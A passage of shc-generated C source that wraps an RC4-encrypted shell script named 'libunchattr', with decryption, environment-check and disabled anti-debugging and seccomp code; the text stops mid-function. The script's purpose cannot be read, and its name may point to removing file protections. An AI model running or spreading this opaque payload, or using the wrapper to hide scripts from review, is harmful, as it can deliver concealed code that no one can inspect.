#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f libunchattr -o libunchattr 
#endif

static  char data [] = 
#define      lsto_z	1
#define      lsto	((&data[0]))
	"\316"
#define      tst1_z	22
#define      tst1	((&data[5]))
	"\156\206\225\236\135\360\213\330\204\342\244\166\026\023\226\241"
	"\237\354\113\142\013\134\071\074\205\357\162\075"
#define      chk1_z	22
#define      chk1	((&data[31]))
	"\367\132\334\355\030\330\003\107\300\030\236\311\302\005\172\372"
	"\270\112\321\377\231\250\275\265\224\122\127"
#define      opts_z	1
#define      opts	((&data[56]))
	"\336"
#define      msg1_z	65
#define      msg1	((&data[62]))
	"\141\252\371\076\173\244\232\344\316\352\070\147\015\363\306\101"
	"\236\150\237\040\322\060\331\273\311\137\105\173\132\360\105\356"
	"\303\271\055\350\046\164\343\015\171\126\352\275\202\037\171\215"
	"\032\300\137\160\070\325\243\210\244\137\002\073\271\100\173\002"
	"\313\010\155\036\251\247\146\076\002\353\006\200\131\215\026"
#define      chk2_z	19
#define      chk2	((&data[140]))
	"\220\174\341\207\254\277\012\033\302\051\321\044\232\310\030\167"
	"\070\115\067\301\031\235\020\327"
#define      msg2_z	19
#define      msg2	((&data[164]))
	"\075\007\263\117\270\342\234\123\072\367\224\117\261\245\164\107"
	"\372\222\255\311\200\043\107"
#define      xecc_z	15
#define      xecc	((&data[183]))
	"\175\222\034\041\223\051\353\204\052\034\253\337\207\340\134\007"
	"\070"
#define      pswd_z	256
#define      pswd	((&data[233]))
	"\055\205\212\063\005\344\300\034\334\300\160\155\075\121\364\024"
	"\307\317\102\005\326\366\124\062\065\005\072\156\364\274\016\041"
	"\101\101\351\242\046\222\006\342\234\244\013\026\003\071\216\204"
	"\114\332\154\272\011\346\001\242\247\106\145\112\212\052\046\004"
	"\153\020\247\222\242\255\164\077\121\177\125\125\271\344\331\005"
	"\276\105\277\307\054\301\152\324\007\320\036\222\373\105\227\146"
	"\125\076\371\367\353\155\066\075\355\213\223\246\157\154\254\055"
	"\262\154\365\337\055\140\263\065\061\321\307\054\026\136\223\153"
	"\235\214\143\211\371\231\306\347\045\131\215\224\306\072\302\171"
	"\246\270\130\324\030\013\011\111\335\321\165\364\060\011\140\315"
	"\225\303\126\217\134\035\166\201\167\004\026\075\076\331\266\345"
	"\221\017\272\251\032\304\363\370\226\151\354\306\162\114\223\007"
	"\020\352\226\155\007\015\356\176\021\005\274\120\336\163\066\157"
	"\202\361\031\235\265\015\225\113\166\202\022\350\317\246\360\337"
	"\220\207\114\230\224\073\026\246\101\323\366\037\106\054\217\310"
	"\036\251\146\323\266\374\037\054\176\061\025\116\327\006\055\147"
	"\215\172\377\042\266\026\310\367\351\276\027\060\353\247\371\011"
	"\120\137\335\006\133\374\063\332\056\111\050\005\117\125\155\335"
	"\320\230\125\107\175\025\144\132\326\324\307\023\046\274\047\356"
	"\213\151\363\141\140\110\224\226\116\316\004\102\213\022\144\315"
	"\253\271\025\050\317\171\202\245\115"
#define      inlo_z	3
#define      inlo	((&data[529]))
	"\053\230\350"
#define      date_z	1
#define      date	((&data[532]))
	"\225"
#define      rlax_z	1
#define      rlax	((&data[533]))
	"\335"
#define      shll_z	10
#define      shll	((&data[535]))
	"\207\176\247\273\104\122\101\017\144\072\144\100"
#define      tst2_z	19
#define      tst2	((&data[547]))
	"\060\150\151\021\310\365\175\314\211\311\112\202\376\000\330\310"
	"\025\347\235\212\342"
#define      text_z	2696
#define      text	((&data[959]))
	"\003\116\304\053\035\076\256\302\214\370\172\000\377\132\143\220"
	"\244\271\203\116\131\013\216\107\142\323\167\104\052\014\364\055"
	"\133\271\131\170\370\010\072\204\001\265\204\000\020\350\220\264"
	"\242\024\002\373\040\220\102\202\143\272\307\216\307\274\274\042"
	"\166\025\232\156\036\325\362\037\213\167\037\233\137\260\117\002"
	"\304\122\375\344\342\100\147\106\372\057\325\301\354\221\344\142"
	"\247\176\320\305\124\303\344\337\073\004\173\233\264\312\235\171"
	"\034\232\136\377\333\305\106\326\365\034\230\341\256\174\104\125"
	"\373\024\033\117\330\000\057\023\004\252\256\271\165\113\062\222"
	"\346\220\222\302\126\331\230\113\365\060\055\244\254\161\372\247"
	"\206\025\367\136\025\047\161\032\322\040\323\107\154\006\332\123"
	"\226\155\025\354\106\255\070\074\335\145\340\212\327\332\062\135"
	"\360\051\273\006\121\055\040\043\116\364\153\272\372\105\016\221"
	"\262\043\175\371\321\266\066\257\033\026\072\363\361\154\120\341"
	"\226\014\347\347\071\010\012\210\375\165\102\367\273\121\210\156"
	"\165\006\147\106\274\236\366\330\264\060\313\246\234\034\210\062"
	"\050\157\032\142\170\044\352\165\232\055\155\125\176\366\304\363"
	"\375\053\072\272\311\060\223\176\141\137\045\375\173\255\060\243"
	"\034\112\006\225\157\360\013\011\035\171\137\234\160\043\217\155"
	"\117\311\050\031\372\273\227\133\032\275\130\225\152\211\071\206"
	"\324\100\034\104\060\050\115\116\241\255\352\022\320\172\177\037"
	"\103\250\071\075\143\321\230\175\216\361\023\370\173\115\177\117"
	"\215\233\223\276\303\341\015\145\216\367\167\137\161\367\176\265"
	"\237\267\362\003\211\213\200\027\175\224\017\370\342\216\107\160"
	"\051\333\057\355\275\074\123\113\347\352\306\002\221\240\037\151"
	"\257\043\073\277\111\131\230\256\326\004\113\152\063\201\274\370"
	"\037\201\171\210\362\164\115\010\134\114\021\204\176\073\261\002"
	"\050\034\354\356\227\170\337\270\301\300\203\127\010\261\043\031"
	"\172\124\003\205\174\260\306\107\171\100\161\102\124\213\345\373"
	"\005\162\110\247\015\276\360\042\062\255\221\024\257\226\313\116"
	"\152\342\001\313\153\233\222\374\230\061\057\355\017\143\007\133"
	"\046\126\017\150\043\014\320\203\355\011\360\366\067\351\107\231"
	"\206\067\363\127\241\041\112\363\362\054\252\177\347\154\025\013"
	"\047\040\233\271\242\234\170\162\206\354\050\155\104\251\273\123"
	"\166\244\075\262\173\362\155\217\267\352\072\201\206\332\171\120"
	"\171\037\132\023\100\052\261\354\177\140\276\174\331\276\064\231"
	"\304\246\124\057\357\165\233\044\343\075\312\267\336\074\323\320"
	"\054\137\371\360\364\373\155\106\210\253\151\232\361\223\312\153"
	"\363\155\054\277\006\250\306\344\076\056\201\227\166\277\117\146"
	"\246\340\105\246\137\007\045\032\010\260\052\304\104\373\056\305"
	"\345\107\141\043\217\224\330\352\163\344\127\016\062\037\027\343"
	"\346\346\073\225\307\167\122\222\005\360\104\023\006\352\120\002"
	"\067\113\200\307\114\303\122\351\312\145\147\034\046\124\115\336"
	"\120\000\263\016\052\321\053\313\242\164\106\256\300\342\130\166"
	"\363\122\021\037\212\216\011\324\334\106\331\307\177\206\137\233"
	"\045\234\330\034\341\350\020\133\054\061\367\111\007\052\003\214"
	"\276\072\347\373\325\100\330\264\051\173\374\222\252\054\053\044"
	"\323\152\362\254\036\273\361\251\147\333\375\121\051\265\311\054"
	"\110\154\376\171\171\163\263\213\007\014\055\303\246\362\123\331"
	"\116\353\000\051\245\340\326\376\022\240\216\062\355\242\202\003"
	"\040\070\003\141\041\024\177\104\011\100\001\275\245\124\341\074"
	"\213\263\016\367\275\160\134\316\116\221\346\362\315\170\042\357"
	"\250\023\075\354\243\122\335\044\126\203\023\315\126\076\273\044"
	"\044\120\037\154\173\200\103\301\172\350\251\377\060\241\372\120"
	"\257\353\345\044\023\233\146\346\061\047\304\077\065\263\253\237"
	"\110\204\226\313\112\024\020\034\242\251\211\231\016\157\002\000"
	"\207\312\043\111\304\265\050\023\203\066\026\056\376\062\023\113"
	"\177\132\240\115\237\025\065\052\165\342\360\135\201\365\065\011"
	"\223\001\117\024\356\202\167\150\051\104\312\365\300\357\142\203"
	"\170\326\142\242\202\320\146\055\302\374\022\301\362\156\230\277"
	"\116\223\036\376\102\160\130\060\272\330\335\012\357\277\204\320"
	"\255\030\207\014\137\205\343\155\177\046\201\275\051\230\360\231"
	"\121\263\153\376\112\347\343\340\130\061\342\241\212\127\012\050"
	"\050\222\273\064\265\301\343\074\302\306\332\244\061\070\375\254"
	"\270\246\347\157\350\164\127\171\354\115\103\364\250\002\146\067"
	"\027\050\053\323\223\126\232\345\235\057\000\320\143\056\055\067"
	"\362\021\313\343\011\331\324\071\075\025\352\076\355\156\062\322"
	"\345\221\025\106\204\343\201\067\067\351\163\040\306\062\256\166"
	"\113\164\134\142\330\176\060\334\067\174\276\240\075\130\072\140"
	"\370\337\305\373\320\323\352\026\167\350\372\243\032\241\202\253"
	"\344\146\124\341\234\026\350\136\377\151\271\110\342\205\050\235"
	"\012\211\367\016\220\345\227\010\205\327\351\266\262\045\032\354"
	"\133\244\337\175\023\043\175\235\246\162\256\161\075\152\070\115"
	"\205\116\020\243\310\256\234\207\000\054\263\037\120\304\030\041"
	"\215\251\100\340\166\371\075\304\157\174\074\335\166\374\365\000"
	"\105\263\250\325\040\101\015\203\347\310\006\345\342\353\245\027"
	"\241\315\375\061\350\224\320\317\265\310\075\111\334\074\354\320"
	"\175\242\203\006\251\202\054\173\026\166\175\327\275\170\211\243"
	"\100\020\277\342\127\142\144\006\326\174\231\133\200\176\266\237"
	"\160\046\250\033\220\314\237\173\145\270\307\010\302\253\066\354"
	"\221\010\165\315\217\035\257\302\304\320\345\241\064\066\365\211"
	"\307\211\332\156\001\010\253\227\171\107\131\166\316\126\003\166"
	"\045\174\363\016\341\066\255\354\367\160\046\015\154\250\315\033"
	"\203\062\167\073\153\172\121\030\130\037\140\024\143\346\101\233"
	"\112\022\247\012\254\367\326\112\210\323\213\101\024\011\020\122"
	"\013\071\165\342\130\023\200\054\364\143\034\353\122\001\055\210"
	"\320\151\156\247\273\114\046\063\307\027\023\013\302\313\304\000"
	"\300\116\066\154\176\275\351\165\050\127\363\005\171\257\351\053"
	"\077\141\305\345\035\132\327\154\056\324\060\372\274\345\145\232"
	"\342\040\311\107\022\306\031\222\117\334\127\263\124\251\113\055"
	"\022\015\354\071\231\357\343\274\132\370\026\310\046\246\301\035"
	"\201\356\032\045\025\203\264\007\041\357\216\077\175\272\203\207"
	"\045\270\034\221\106\300\111\172\274\134\160\342\124\002\070\245"
	"\016\213\235\204\313\051\376\003\044\020\077\231\364\062\132\024"
	"\305\155\067\322\022\066\174\355\327\317\222\360\200\323\252\007"
	"\140\027\360\252\075\313\124\215\072\017\342\023\144\122\141\101"
	"\140\346\212\174\132\017\122\165\276\137\261\023\001\120\167\351"
	"\203\234\367\070\107\253\354\125\003\161\256\320\017\327\376\346"
	"\163\265\246\276\124\334\304\057\231\103\254\136\226\174\263\040"
	"\062\047\037\310\033\061\022\332\301\205\215\234\311\073\365\057"
	"\272\152\311\347\237\177\015\145\324\200\243\103\357\307\255\117"
	"\062\240\255\270\107\266\300\226\356\264\253\052\232\014\174\210"
	"\316\100\235\222\152\216\167\362\333\235\326\113\157\157\150\023"
	"\035\163\145\151\026\050\005\222\072\165\126\114\020\312\277\075"
	"\337\343\134\051\350\270\111\235\140\266\321\016\227\211\122\137"
	"\260\136\014\344\335\267\326\013\012\060\175\275\122\205\215\052"
	"\264\173\111\326\061\150\237\173\206\002\006\354\052\361\036\252"
	"\012\014\026\071\025\341\335\114\303\060\160\210\261\056\244\222"
	"\153\221\141\201\325\325\373\242\141\026\066\303\162\134\227\273"
	"\055\177\203\222\213\077\251\351\120\016\220\244\310\240\117\200"
	"\303\100\271\315\063\072\000\364\253\107\154\354\070\205\112\307"
	"\244\232\302\301\113\173\362\330\325\133\332\000\260\217\201\266"
	"\273\265\102\027\120\121\322\346\043\072\374\114\276\266\216\111"
	"\365\352\016\207\130\276\115\303\057\003\311\321\042\241\234\222"
	"\376\237\165\054\130\054\275\373\171\055\206\305\003\224\220\112"
	"\077\370\263\223\337\017\262\312\237\103\024\211\043\342\024\334"
	"\207\270\143\356\336\371\223\231\141\222\331\223\350\013\126\070"
	"\075\207\272\142\126\111\304\324\270\052\253\110\241\175\015\326"
	"\051\167\324\356\060\014\035\363\151\275\025\070\025\264\307\256"
	"\355\155\374\232\022\365\232\270\377\046\353\200\237\222\340\345"
	"\142\346\233\371\302\212\040\342\266\114\021\235\305\076\132\037"
	"\036\141\002\161\265\246\341\205\002\226\052\060\007\235\146\332"
	"\214\344\124\341\252\121\177\324\052\044\363\210\353\071\373\066"
	"\133\031\133\337\040\164\260\111\117\332\102\313\256\053\123\363"
	"\035\327\052\344\240\222\172\053\262\224\213\302\230\265\135\057"
	"\075\152\033\252\331\330\215\211\005\372\056\372\367\143\157\170"
	"\045\025\050\150\126\111\076\237\231\254\045\375\037\021\144\315"
	"\016\373\230\135\321\146\366\170\230\001\004\200\263\101\346\160"
	"\116\043\176\175\070\216\316\365\241\156\120\141\161\324\176\245"
	"\223\175\043\315\252\224\230\075\075\007\277\343\261\146\023\203"
	"\210\153\231\233\247\071\163\035\106\223\201\142\052\017\202\072"
	"\214\177\245\320\273\204\340\025\175\057\322\120\017\333\207\162"
	"\034\355\324\235\242\224\344\014\065\203\277\134\216\114\064\225"
	"\042\061\306\235\364\065\326\106\153\364\012\010\010\140\124\162"
	"\320\007\031\011\301\231\151\273\117\365\324\100\246\140\155\336"
	"\057\256\275\237\322\302\100\126\253\176\062\066\356\172\142\157"
	"\051\255\144\046\023\347\103\112\204\254\336\271\333\352\267\065"
	"\314\323\122\277\360\277\222\205\362\142\265\122\174\227\012\010"
	"\363\016\040\066\207\115\140\264\003\335\122\372\156\377\131\071"
	"\223\353\047\306\252\064\320\317\063\235\327\330\163\075\304\143"
	"\133\025\107\324\231\216\156\045\022\204\260\117\324\135\346\012"
	"\021\172\014\322\124\263\263\104\374\271\111\172\075\060\215\306"
	"\311\272\007\142\352\127\345\170\246\335\136\065\200\221\271\166"
	"\165\013\324\213\052\054\062\053\151\060\234\225\213\262\146\034"
	"\007\035\132\353\077\073\347\236\230\012\363\237\314\264\234\252"
	"\156\365\323\227\320\163\007\133\362\307\066\170\334\017\357\246"
	"\115\157\144\173\336\136\107\136\016\264\267\225\053\013\254\330"
	"\262\306\042\055\242\353\015\010\217\030\345\371\231\257\214\011"
	"\013\151\055\274\307\367\026\171\337\301\174\237\102\043\350\360"
	"\332\175\102\151\170\272\215\305\321\113\006\323\352\266\122\035"
	"\317\353\136\311\056\020\174\267\032\000\226\242\171\226\174\304"
	"\004\213\067\232\202\031\151\375\173\011\076\374\270\064\043\240"
	"\005\366\116\276\163\046\344\040\213\175\016\053\073\152\142\030"
	"\055\207\271\253\171\256\230\152\132\277\160\303\157\042\275\364"
	"\153\222\073\241\071\100\166\111\334\335\004\047\243\030\272\120"
	"\345\167\246\301\263\344\261\002\303\177\261\131\323\001\240\260"
	"\003\040\354\053\065\142\077\003\054\060\355\201\111\121\140\044"
	"\015\172\033\106\111\267\025\266\070\326\277\051\047\244\252\013"
	"\042\167\277\041\257\176\316\246\347\366\072\117\116\070\301\206"
	"\277\004\011\045\302\026\376\356\375\050\310\276\046\031\022\124"
	"\212\154\112\245\012\173\212\201\331\074\244\120\072\332\010\027"
	"\337\022\246\161\102\222\356\002\133\211\367\043\000\270\141\101"
	"\143\246\206\201\253\111\174\177\112\066\032\121\354\273\015\060"
	"\331\374\306\175\365\065\174\046\177\103\073\041\007\262\056\120"
	"\241\005\135\245\225\015\105\355\111\050\154\254\125\235\306\376"
	"\201\141\225\145\272\202\102\213\037\370\370\267\012\167\321\267"
	"\252\061\126\242\025\207\346\070\063\316\237\114\142\144\304\026"
	"\325\174\162\007\053\037\263\037\067\173\333\130\120\245\300\006"
	"\153\075\161\300\056\177\272\377\220\073\243\247\216\124\306\005"
	"\204\305\313\217\307\145\014\044\007\037\251\234\377\231\115\346"
	"\307\311\100\110\250\147\126\323\160\342\065\231\164\363\233\041"
	"\060\250\106\332\347\022\241\356\044\301\125\267\320\125\214\152"
	"\202\361\364\016\266\034\372\011\361\367\043\133\111\337\173\362"
	"\031\250\230\224\242\261\324\120\113\143\033\224\040\165\265\051"
	"\256\231\256\362\017\266\360\003\105\357\136\277\161\372\070\352"
	"\341\234\277\303\371\244\060\304\016\050\104\122\041\210\172\237"
	"\003\127\151\007\147\051\054\122\327\174\047\042\367\237\304\234"
	"\021\003\035\150\042\355\173\271\160\001\242\122\036\006\235\160"
	"\245\343\235\041\202\064\313\230\051\274\336\015\057\342\256\212"
	"\140\025\320\022\322\336\077\163\157\133\014\366\077\000\213\172"
	"\030\137\144\347\036\002\023\125\324\055\244\361\174\267\206\245"
	"\014\060\162\167\227\016\222\060\370\146\326\305\303\332\031\154"
	"\270\012\254\016\014\210\214\277\330\346\244\054\353\072\047\002"
	"\200\161\040\347\351\062\063\156\024\361\234\243\331\252\110\024"
	"\177\265\042\167\151\072\310\002\274\376\145\271\156\317\316\256"
	"\345\133\125\364\373\115\330\366\126\110\310\236\350\067\321\023"
	"\223\160\050\211\325\030\271\225\041\244\165\304\276\074\172\112"
	"\363\256\112\372\147\364\154\312\321\065\163\073\167\126\205\233"
	"\143\347\165\333\335\275\034\251\224\237\335\117\334\151\075\014"
	"\172\304\121\157\000\064\143\177\101\311\324\250\377\076\112\232"
	"\362\247\203\164\234\372\327\030\015\022\042\345\027\213\074\040"
	"\330\072\153\127\177\044\266\105\164\264\237\107\130\250\225\342"
	"\115\376\014\335\222\143\065\300\122\022\317\176\026\062\037\266"
	"\064\313\252\246\303\051\133\142\341\116\145\152\331\346\201\126"
	"\173\221\117\135\037\227\315\111\162\374\067\057\071\212\173\155"
	"\126\046\023\031\120\156\174\062\274\341\235\226\310\037\355\103"
	"\260\074\241\317\323\156\031\106\153\120\166\244\333\362\021\061"
	"\031\045\112\151\223\306\234\120\250\071\347\160\130\325\264\010"
	"\022\125\330\346\304\361\055\060\101\243\324\035\226\346\116\257"
	"\014\231\031\237\137\265\360\010\356\330\171\107\256\055\120\300"
	"\203\050\247\107\032\324\167\134\170\114\171\016\063\307\276\077"
	"\140\327\337\300\215\320\311\173\251\102\303\127\160\023\027\364"
	"\074\276\074\126\223\264\262\013\000\053\031\064\363\330\164\124"
	"\257\123\025\074\044\336\270\315\041\173\044\222\216\074\206\312"
	"\373\302\041\216\166\324\231\167\377\263\254\363\213\040\110\073"
	"\164\135\170\230\074\060\146\136\254\213\360\073\307\167\006\302"
	"\072\047\121\261\373\352\050\373\236\325\357\051\365\067\145\152"
	"\225\335\003\321\015\151\057\272\364\040\365\274\227\373\177\322"
	"\043\320\203\037\273\253\032\131\201\012\203\166\101\350\341\326"
	"\305\344\250\323\116\330\215\103\370\203\377\220\177\177\142\243"
	"\117\345\302\012\221\335\144\022\347\347\211\051\320\153\377\226"
	"\117\247\151\236\200\367\341\170\173\341\011\372\140\153\236\257"
	"\121\140\272\343\075\037\366\045\007\200\116\327\353\116\155\072"
	"\366\327\331\166\317\272\357\112\233\370\105\373\144\343\253\266"
	"\103\146\231\201\206\220\247\215\020\366\145\374\104\322\067\072"
	"\252\020\261\171\312\240\303\145\231\011\141\375\354\015\264\060"
	"\163\116\262\372\336\131\207\357\117\354\353\224\277\042\317\151"
	"\062\200\342\374\041\246\142\272\257\303\270\233\320\154\314\104"
	"\272\176\076\231\327\306\210\047\262\163\274\162\225\213\333\307"
	"\014\275\304\055\144\046\350\023\352\240\257\273\015\173\000\310"
	"\371\076\141\321\005\351\371\270\134\265\052\362\100\005\271\114"
	"\303\175\172\047\244\142\073\216\003\352\111\021\145\111\331"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
